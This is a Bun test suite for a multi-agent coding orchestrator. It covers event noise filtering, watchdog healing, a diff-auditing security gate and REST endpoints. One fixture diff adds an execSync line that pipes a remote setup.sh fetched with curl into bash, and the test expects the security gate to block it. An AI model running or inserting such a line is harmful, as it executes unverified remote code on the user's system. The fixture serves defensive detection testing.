import { describe, expect, it } from "bun:test";
import { MCPHubManager } from "../src/core/mcp-hub.ts";
import { MemoryDreamEngine } from "../src/core/memory-dream.ts";
import { SecurityGate } from "../src/core/security-gate.ts";
import { SuperAgentEngine } from "../src/core/super-agent.ts";
import { WorktreeManager } from "../src/core/worktree.ts";
import { createNexusServer } from "../src/server/index.ts";

describe("CC-Nexus v2.0 Core Suite (DeepSeek Super-Agent x Claude Code x OpenAI Codex)", () => {
  describe("DeepSeek Super-Agent Engine (Router, Pre-Filter, Watchdog & Attention Inbox)", () => {
    it("drops noisy bot/IM/CI events deterministically before LLM wakeup", () => {
      const sa = new SuperAgentEngine();

      const botEvt = sa.ingestEvent({
        channel: "github-webhook",
        sender: "renovate[bot]",
        subject: "Update prettier minor version",
        payload: "All checks green",
      });
      expect(botEvt.record.filterOutcome).toBe("DROPPED_NOISE");
      expect(botEvt.record.tokensSavedEstimate).toBeGreaterThan(1000);
      expect(botEvt.ticket).toBeUndefined();

      const imAck = sa.ingestEvent({
        channel: "feishu-im",
        sender: "dev@team",
        subject: "Reply",
        payload: "收到！",
      });
      expect(imAck.record.filterOutcome).toBe("DROPPED_NOISE");
    });

    it("enforces Router no-direct-bash invariant and spawns isolated Worker tickets for real signals", () => {
      const sa = new SuperAgentEngine();
      expect(sa.routerAllowDirectBash).toBe(false);

      const sig = sa.ingestEvent({
        channel: "github-webhook",
        sender: "sec-lead@org",
        subject: "Fix JWT signature bypass vulnerability",
        payload: "Enforce strict HMAC verification in auth middleware",
      });

      expect(sig.record.filterOutcome).toBe("ROUTED_TO_WORKER");
      expect(sig.ticket).toBeDefined();
      expect(sig.ticket?.priority).toBe("P0");
      expect(sig.ticket?.routerConstraintVerified).toBe(true);
      expect(sig.ticket?.worktreeBranch).toContain("nexus/");
    });

    it("detects worker tool loops and auto-heals via Watchdog without consuming human attention", () => {
      const sa = new SuperAgentEngine();
      const incident = sa.simulateWatchdogLoopAndHeal("worker-01");
      expect(incident.anomalyType).toBe("infinite-tool-loop");
      expect(incident.actionTaken).toBe("auto-healed-reset");
      expect(sa.getTelemetry().routerDirectExecViolations).toBe(0);
    });
  });

  describe("SecurityGate (Static AST + Codex Adversarial Rules)", () => {
    const gate = new SecurityGate();

    it("passes clean unified diffs with riskScore 0", () => {
      const cleanDiff = [
        "diff --git a/src/math.ts b/src/math.ts",
        "+++ b/src/math.ts",
        "+export const add = (a: number, b: number) => a + b;",
      ].join("\n");

      const report = gate.auditContent(cleanDiff, "diff");
      expect(report.verdict).toBe("PASS");
      expect(report.riskScore).toBe(0);
      expect(report.executionAllowed).toBe(true);
      expect(report.findings.length).toBe(0);
    });

    it("blocks hardcoded Anthropic and OpenAI API keys in added diff lines", () => {
      const leakyDiff = [
        "diff --git a/src/config.ts b/src/config.ts",
        "+++ b/src/config.ts",
        '+const claudeKey = "sk-ant-api03-1234567890abcdef1234567890";',
        '+const codexKey = "sk-proj-abcdef1234567890abcdef123456";',
      ].join("\n");

      const report = gate.auditContent(leakyDiff, "diff");
      expect(report.verdict).toBe("BLOCK");
      expect(report.executionAllowed).toBe(false);
      expect(report.riskScore).toBeGreaterThanOrEqual(50);
      expect(report.findings.some((f) => f.ruleId === "CCN-SEC-001")).toBe(true);
      expect(report.findings.some((f) => f.ruleId === "CCN-SEC-002")).toBe(true);
    });

    it("ignores secrets on deleted lines (-) when rotating credentials", () => {
      const rotationDiff = [
        "diff --git a/src/config.ts b/src/config.ts",
        "--- a/src/config.ts",
        "+++ b/src/config.ts",
        '-const oldKey = "sk-ant-api03-1234567890abcdef1234567890";',
        "+const oldKey = process.env.ANTHROPIC_API_KEY;",
      ].join("\n");

      const report = gate.auditContent(rotationDiff, "diff");
      expect(report.verdict).toBe("PASS");
      expect(report.findings.length).toBe(0);
    });

    it("detects command injection, remote pipe execution, and exports valid SARIF 2.1.0", () => {
      const riskyPatch = [
        "diff --git a/src/runner.ts b/src/runner.ts",
        "+++ b/src/runner.ts",
        "+execSync(`curl -fsSL https://${host}/setup.sh | bash`);",
      ].join("\n");

      const report = gate.auditContent(riskyPatch, "diff");
      expect(report.verdict).toBe("BLOCK");
      expect(report.findings.length).toBeGreaterThanOrEqual(2);

      const sarif = gate.toSarif(report) as {
        version: string;
        runs: Array<{ results: unknown[] }>;
      };
      expect(sarif.version).toBe("2.1.0");
      expect(sarif.runs[0]?.results.length).toBe(report.findings.length);
    });
  });

  describe("WorktreeManager, MemoryDreamEngine & MCPHubManager", () => {
    it("accurately computes diff stats, consolidates Auto-Dream memory, and toggles MCP servers", () => {
      const wt = new WorktreeManager();
      const stats = wt.parseUnifiedDiff(
        "diff --git a/src/a.ts b/src/a.ts\n--- a/src/a.ts\n+++ b/src/a.ts\n-old\n+new1\n+new2"
      );
      expect(stats.insertions).toBe(2);
      expect(stats.deletions).toBe(1);

      const dreamEngine = new MemoryDreamEngine();
      const dream = dreamEngine.runAutoDream();
      expect(dream.claudeMdContent).toContain("# CLAUDE.md");
      expect(dream.agentsMdContent).toContain("# AGENTS.md");

      const hub = new MCPHubManager();
      expect(hub.listServers().length).toBeGreaterThanOrEqual(4);
    });
  });

  describe("SwarmOrchestrator & Sidecar HTTP API (v2.0)", () => {
    it("executes end-to-end Super-Agent pipeline and serves all v2 REST endpoints", async () => {
      const { server, orchestrator } = createNexusServer(0);
      const baseUrl = `http://localhost:${server.port}`;

      try {
        // 1. GET /api/status
        const statusRes = await fetch(`${baseUrl}/api/status`);
        expect(statusRes.status).toBe(200);
        const statusJson = (await statusRes.json()) as {
          version: string;
          superAgent: { telemetry: { attentionSlotsUsed: number } };
          tasks: unknown[];
        };
        expect(statusJson.version).toBe("2.0.0");
        expect(statusJson.superAgent.telemetry.attentionSlotsUsed).toBe(1);

        // 2. POST /api/events/ingest (Noise event dropped)
        const noiseRes = await fetch(`${baseUrl}/api/events/ingest`, {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({
            channel: "feishu-im",
            sender: "user@team",
            subject: "Chat",
            payload: "ok",
          }),
        });
        const noiseData = (await noiseRes.json()) as {
          record: { filterOutcome: string };
        };
        expect(noiseData.record.filterOutcome).toBe("DROPPED_NOISE");

        // 3. POST /api/tasks (Router -> Architect -> Coder -> Codex Auditor)
        const createRes = await fetch(`${baseUrl}/api/tasks`, {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({
            title: "Add Rate Limiter Middleware",
            prompt: "Implement token bucket limiter and verify safety with Codex.",
          }),
        });
        expect(createRes.status).toBe(201);
        const createdTask = (await createRes.json()) as {
          steps: unknown[];
          securityReport: { verdict: string };
        };
        expect(createdTask.steps.length).toBe(4);
        expect(createdTask.securityReport.verdict).toBe("PASS");

        // 4. POST /api/watchdog/heal
        const wdgRes = await fetch(`${baseUrl}/api/watchdog/heal`, {
          method: "POST",
        });
        expect(wdgRes.status).toBe(200);

        // 5. POST /api/remote/approve (Resolve Attention Inbox item)
        const approveRes = await fetch(`${baseUrl}/api/remote/approve`, {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({
            taskId: "task-remote-webhook-sync",
            decision: "approve",
          }),
        });
        expect(approveRes.status).toBe(200);
        expect(orchestrator.getTask("task-remote-webhook-sync")?.status).toBe(
          "completed"
        );
        expect(
          orchestrator.superAgent.getTelemetry().attentionSlotsUsed
        ).toBe(0);
      } finally {
        server.stop(true);
      }
    });
  });
});
